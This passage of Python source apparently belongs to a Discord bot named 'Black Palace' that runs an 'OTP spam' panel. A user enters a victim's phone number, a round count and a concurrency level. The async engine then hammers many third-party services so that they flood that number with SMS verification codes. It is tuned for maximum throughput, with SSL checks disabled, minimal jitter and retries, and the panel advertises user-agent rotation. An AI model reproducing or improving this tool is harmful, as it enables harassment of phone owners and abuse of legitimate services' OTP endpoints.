    owner_id: int
    channel_id: int
    running: bool = True
    success: int = 0
    fail: int = 0
    done_rounds: int = 0
    per_service: dict = field(default_factory=lambda: defaultdict(int))
    started_at: float = field(default_factory=time.time)
    task: Optional[asyncio.Task] = None
    status_msg: Optional[discord.Message] = None

jobs: dict[int, SpamJob] = {}  # owner_id -> job

# ─────────────────────────────────────────────
# SPAM ENGINE (strengthened)
# ─────────────────────────────────────────────
async def run_job(job: SpamJob):
    # aggressive pool — high concurrency, short timeouts, minimal jitter
    connector = aiohttp.TCPConnector(
        limit=max(job.concurrency * 4, 120),
        limit_per_host=32,
        ssl=False,
        ttl_dns_cache=300,
        enable_cleanup_closed=True,
        force_close=False,
    )
    timeout = aiohttp.ClientTimeout(total=4.2, connect=2.0, sock_read=3.0)
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        sem = asyncio.Semaphore(job.concurrency)

        async def fire(name: str, fn: Callable):
            if not job.running:
                return
            async with sem:
                # almost no pre-jitter — max throughput
                if random.random() < 0.35:
                    await asyncio.sleep(random.uniform(0.0, 0.04))
                ok = False
                for attempt in range(2):  # 2 attempts, fail fast
                    try:
                        ok = bool(await fn(session, job.phone))
                        if ok:
                            break
                    except Exception:
                        ok = False
                    if attempt == 0:
                        await asyncio.sleep(random.uniform(0.03, 0.12))
                if ok:
                    job.success += 1
                    job.per_service[name] += 1
                else:
                    job.fail += 1

        for r in range(job.rounds):
            if not job.running:
                break
            # priority: SOLID first (more real SMS), then the rest shuffled
            solid_names = {n for n, _ in CAPTURED} | {n for n, _ in REQUESTED} | {n for n, _ in SOLID} | {n for n, _ in SOLID2} | {n for n, _ in SOLID3}
            solid_batch = [(n, f) for n, f in SERVICES if n in solid_names]
            rest_batch = [(n, f) for n, f in SERVICES if n not in solid_names]
            random.shuffle(solid_batch)
            random.shuffle(rest_batch)
            batch = solid_batch + rest_batch
            tasks = [asyncio.create_task(fire(name, fn)) for name, fn in batch]
            await asyncio.gather(*tasks, return_exceptions=True)
            job.done_rounds += 1
            # minimal gap between rounds
            await asyncio.sleep(random.uniform(0.04, 0.15))

        job.running = False

# ─────────────────────────────────────────────
# DISCORD PANEL
# ─────────────────────────────────────────────
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

def is_allowed(user: discord.User | discord.Member) -> bool:
    if not OWNER_IDS:
        return True
    return user.id in OWNER_IDS

class StartModal(discord.ui.Modal, title="Black Palace — Start Spam"):
    phone = discord.ui.TextInput(label="Phone (05XXXXXXXX)", placeholder="0521234567", min_length=9, max_length=12)
    rounds = discord.ui.TextInput(label="Rounds (full service sets)", placeholder="25", default="20")
    concurrency = discord.ui.TextInput(label="Concurrency (parallel requests)", placeholder="80", default="60")

    async def on_submit(self, interaction: discord.Interaction):
        if not is_allowed(interaction.user):
            return await interaction.response.send_message("אין הרשאה.", ephemeral=True)
        if interaction.user.id in jobs and jobs[interaction.user.id].running:
            return await interaction.response.send_message("יש כבר job פעיל. עצור אותו קודם.", ephemeral=True)

        phone = p0(self.phone.value.strip())
        if not phone.isdigit() or len(phone) < 9:
            return await interaction.response.send_message("מספר לא תקין.", ephemeral=True)
        if not phone.startswith("0"):
            phone = "0" + phone

        try:
            rounds = max(1, min(int(self.rounds.value), 500))
            conc = max(1, min(int(self.concurrency.value), 150))
        except ValueError:
            return await interaction.response.send_message("rounds / concurrency חייבים להיות מספרים.", ephemeral=True)

        job = SpamJob(phone=phone, rounds=rounds, concurrency=conc, owner_id=interaction.user.id, channel_id=interaction.channel_id)
        jobs[interaction.user.id] = job
        job.task = asyncio.create_task(run_job(job))

        embed = build_status_embed(job)
        view = ControlView(job.owner_id)
        await interaction.response.send_message(embed=embed, view=view)
        job.status_msg = await interaction.original_response()

        # live updater
        asyncio.create_task(live_updater(job))

class ControlView(discord.ui.View):
    def __init__(self, owner_id: int):
        super().__init__(timeout=None)
        self.owner_id = owner_id

    @discord.ui.button(label="Stop", style=discord.ButtonStyle.danger, emoji="🛑")
    async def stop_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id != self.owner_id and not is_allowed(interaction.user):
            return await interaction.response.send_message("לא שלך.", ephemeral=True)
        job = jobs.get(self.owner_id)
        if not job or not job.running:
            return await interaction.response.send_message("אין job פעיל.", ephemeral=True)
        job.running = False
        await interaction.response.send_message("עוצר…", ephemeral=True)
        if job.status_msg:
            try:
                await job.status_msg.edit(embed=build_status_embed(job), view=None)
            except Exception:
                pass

    @discord.ui.button(label="Refresh", style=discord.ButtonStyle.secondary, emoji="🔄")
    async def refresh_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        job = jobs.get(self.owner_id)
        if not job:
            return await interaction.response.send_message("אין job.", ephemeral=True)
        await interaction.response.edit_message(embed=build_status_embed(job), view=self)

    @discord.ui.button(label="New Run", style=discord.ButtonStyle.primary, emoji="🚀")
    async def new_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not is_allowed(interaction.user):
            return await interaction.response.send_message("אין הרשאה.", ephemeral=True)
        await interaction.response.send_modal(StartModal())

def build_status_embed(job: SpamJob) -> discord.Embed:
    elapsed = int(time.time() - job.started_at)
    rate = (job.success + job.fail) / max(elapsed, 1)
    top = sorted(job.per_service.items(), key=lambda x: -x[1])[:8]
    top_str = "\n".join(f"`{n}` → **{c}**" for n, c in top) or "—"

    color = discord.Color.green() if job.running else discord.Color.dark_grey()
    embed = discord.Embed(
        title="🖤 BLACK PALACE PANEL",
        description=f"**Phone:** `{job.phone}`\n**Rounds:** {job.done_rounds}/{job.rounds}\n**Concurrency:** {job.concurrency}",
        color=color,
        timestamp=discord.utils.utcnow(),
    )
    embed.add_field(name="✅ Success", value=str(job.success), inline=True)
    embed.add_field(name="❌ Fail", value=str(job.fail), inline=True)
    embed.add_field(name="⚡ Rate", value=f"{rate:.1f}/s", inline=True)
    embed.add_field(name="Status", value="🟢 RUNNING" if job.running else "⚫ STOPPED", inline=True)
    embed.add_field(name="Elapsed", value=f"{elapsed}s", inline=True)
    embed.add_field(name="Services", value=str(len(SERVICES)), inline=True)
    embed.add_field(name="Top hits", value=top_str, inline=False)
    embed.set_footer(text="Black Palace · same APIs · strengthened async engine")
    return embed

async def live_updater(job: SpamJob):
    while job.running:
        await asyncio.sleep(3)
        if job.status_msg:
            try:
                await job.status_msg.edit(embed=build_status_embed(job), view=ControlView(job.owner_id))
            except Exception:
                break
    if job.status_msg:
        try:
            await job.status_msg.edit(embed=build_status_embed(job), view=ControlView(job.owner_id))
        except Exception:
            pass

class PanelView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="Start Spam", style=discord.ButtonStyle.danger, emoji="💥", custom_id="bp_start")
    async def start(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not is_allowed(interaction.user):
            return await interaction.response.send_message("אין הרשאה.", ephemeral=True)
        await interaction.response.send_modal(StartModal())

    @discord.ui.button(label="Status", style=discord.ButtonStyle.secondary, emoji="📊", custom_id="bp_status")
    async def status(self, interaction: discord.Interaction, button: discord.ui.Button):
        job = jobs.get(interaction.user.id)
        if not job:
            return await interaction.response.send_message("אין job פעיל.", ephemeral=True)
        await interaction.response.send_message(embed=build_status_embed(job), ephemeral=True)

@bot.event
async def on_ready():
    print(f"[Black Palace] logged in as {bot.user} | services={len(SERVICES)}")
    try:
        synced = await bot.tree.sync()
        print(f"synced {len(synced)} commands")
    except Exception as e:
        print("sync error:", e)
    bot.add_view(PanelView())

@bot.tree.command(name="panel", description="Open Black Palace control panel")
async def panel_cmd(interaction: discord.Interaction):
    if not is_allowed(interaction.user):
        return await interaction.response.send_message("אין הרשאה.", ephemeral=True)
    embed = discord.Embed(
        title="🖤 BLACK PALACE",
        description=(
            "**OTP spam panel** — אותם API ואתרים כמו המקור, מנוע async חזק יותר.\n\n"
            "• Start → הזן מספר + rounds + concurrency\n"
            "• Stop / Refresh על ה-job עצמו\n"
            f"• **{len(SERVICES)}** services פעילים\n"
            "• Jitter + retries + UA rotation + connection pool"
        ),
        color=discord.Color.dark_purple(),
    )
    embed.set_footer(text="Creator-style · Discord panel")
    await interaction.response.send_message(embed=embed, view=PanelView())

@bot.tree.command(name="stop", description="Force stop your current job")
async def stop_cmd(interaction: discord.Interaction):
    job = jobs.get(interaction.user.id)
    if not job or not job.running:
        return await interaction.response.send_message("אין job פעיל.", ephemeral=True)
    job.running = False
    await interaction.response.send_message("נעצר.", ephemeral=True)

def main():
    if not BOT_TOKEN:
        print("Missing DISCORD_BOT_TOKEN — put it in .env")
        return
    bot.run(BOT_TOKEN)

if __name__ == "__main__":
    main()
